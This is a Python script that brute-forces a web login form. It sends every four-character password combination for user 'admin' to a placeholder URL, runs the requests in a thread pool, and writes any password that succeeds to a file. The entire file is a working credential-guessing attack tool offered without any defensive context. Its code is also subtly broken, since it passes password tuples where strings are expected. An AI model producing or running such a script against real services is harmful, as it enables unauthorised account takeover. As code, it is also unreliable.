import requests
import itertools
import concurrent.futures
import string

# Define the URL
url = 'http://example.com/login'

# The username to use for the brute force attack
username = 'admin'

# The characters to use in the brute force attack
chars = string.ascii_letters + string.digits + string.punctuation

def brute_force(password):
    response = send_request(username, password)
    if 'failed to login' not in response:
        with open('correct_password.txt', 'a') as f:
            f.write(password + '\n')

def send_request(username, password):
    data = {
        'username': username,
        'password': password
    }
    response = requests.post(url, data=data)
    return response.text

# Use a thread pool to parallelize the requests
with concurrent.futures.ThreadPoolExecutor() as executor:
    executor.map(brute_force, itertools.product(chars, repeat=4))